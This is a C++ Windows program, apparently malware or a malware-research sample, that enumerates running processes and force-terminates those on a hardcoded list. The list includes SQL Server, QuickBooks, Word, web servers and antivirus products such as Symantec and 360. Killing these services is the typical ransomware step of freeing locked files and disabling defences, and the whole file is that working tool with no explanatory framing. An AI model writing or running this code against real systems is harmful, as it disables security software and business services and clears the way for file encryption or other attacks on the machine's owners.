//Author: Shaddy43

#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <codecvt>

std::string convertor(wchar_t*);

std::vector<std::string> processes;
int process_disruptor = 0;

const std::vector<std::string> processNames = {
    "wxServer.exe",
    "wxServerView",
    "sqlservr.exe",
    "sqlmangr.exe",
    "RAgui.exe",
    "supervise.exe",
    "Culture.exe",
    "RTVscan.exe",
    "Defwatch.exe",
    "sqlbrowser.exe",
    "WINWORD.EXE",
    "QBW32.exe",
    "QBDBMgr.exe",
    "qbupdate.exe",
    "QBCFMonitorService.exe",
    "axlbridge.exe",
    "QBIDPService.exe",
    "httpd.exe",
    "fdlauncher.exe",
    "MsDtSrvr.exe",
    "tomcat6.exe",
    "java.exe",
    "360se.exe",
    "360doctor.exe",
    "wdswfsafe.exe",
    "fdlauncher.exe",
    "fdhost.exe",
    "GDscan.exe",
    "ZhuDongFangYu.exe"
};

int main()
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create process snapshot\n";
        return -1;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);
    if (!Process32First(hSnapshot, &processEntry))
    {
        std::cerr << "Failed to retrieve first process\n";
        CloseHandle(hSnapshot);
        return -1;
    }

    do
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
        if (hProcess != NULL)
        {
            std::string processNameStr = convertor(processEntry.szExeFile);
            for (const auto& name : processNames)
            {
                //std::cout << "Enumerating processes" << "\n";
                if (processNameStr == name)
                {
                    std::cout << "Terminating process " << processNameStr << " (PID: " << processEntry.th32ProcessID << ")...\n";
                    if (TerminateProcess(hProcess, 0))
                    {
                        //std::cout << "Process " << processNameStr << " terminated successfully\n";
                        processes.push_back("Process Terminated: "+ processNameStr);
                        process_disruptor++;
                    }
                    else
                    {
                        std::cerr << "Failed to terminate process " << processNameStr << "\n";
                        processes.push_back("Failed to terminate: " + processNameStr);
                    }
                }
                else
                {
                    //std::cout << "Process name not matched" << "\n";
                    continue;
                }
            }
            CloseHandle(hProcess);
        }
    } while (Process32Next(hSnapshot, &processEntry));
    CloseHandle(hSnapshot);

    std::cout << "\nKilled Processes..." << std::endl;
    for (int i = 0; i < process_disruptor; i++)
    {
        std::cout << processes[i] << std::endl;
    }

    return 0;
}

std::string convertor(wchar_t* myWChar)
{
    std::wstring wstr = std::wstring(myWChar);

    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::string str = converter.to_bytes(wstr);
    return str;
}